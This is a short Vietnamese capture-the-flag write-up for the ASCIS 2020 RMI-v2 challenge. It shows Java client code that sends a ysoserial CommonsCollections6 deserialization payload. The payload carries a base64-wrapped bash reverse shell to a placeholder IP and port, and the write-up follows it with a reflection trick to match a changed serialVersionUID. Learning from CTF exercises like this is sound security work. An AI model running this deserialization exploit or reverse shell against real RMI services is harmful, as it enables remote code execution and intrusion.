# Introduce:
Bài này mình viết một các bước khai thác mà mình và một người anh cựu sinh viên cùng nhau làm.
# Step 1:
Dựa vào hint của tác giả với blog <a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">này</a> có thể sử dụng gadget CommonsCollections6 để khai thác. Chỉnh sửa lại client lại 1 chút để gửi payload.

```
public static void main(String[] args) throws Exception {
        String serverIP = "IP";
        int serverPort = Integer.parseInt("PORT");
        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
        ASCISInterf ascisInterf = (ASCISInterf)registry.lookup("ascis");
        Object payload = new CommonsCollections6().getObject("bash -c {echo,BASE64(bash -i >& /dev/tcp/IP/PORT 0>&1)}|{base64,-d}|{bash,-i}");
        System.out.println(ascisInterf.login(payload));
    }
```
Nhận được exception như dưới:
<img src="https://raw.githubusercontent.com/trungthiennguyen/CTF-Writeup/main/ASCIS-2020-Quals/RMI-v2/image_2020-11-02_17-29-08.png">
Dựa vào đây biết được tác giả đã đổi biến static final serialVersionUID thành -1333713373713373737L.
# Step 2:
Sử dụng java reflection để thay đổi biến static final lại thành -1333713373713373737L là xong.
<img src="https://raw.githubusercontent.com/trungthiennguyen/CTF-Writeup/main/ASCIS-2020-Quals/RMI-v2/vul1.png">
# Note:
Sau khi bruteforce class của ysoserial thì còn có thể sử dụng CommonsCollections5
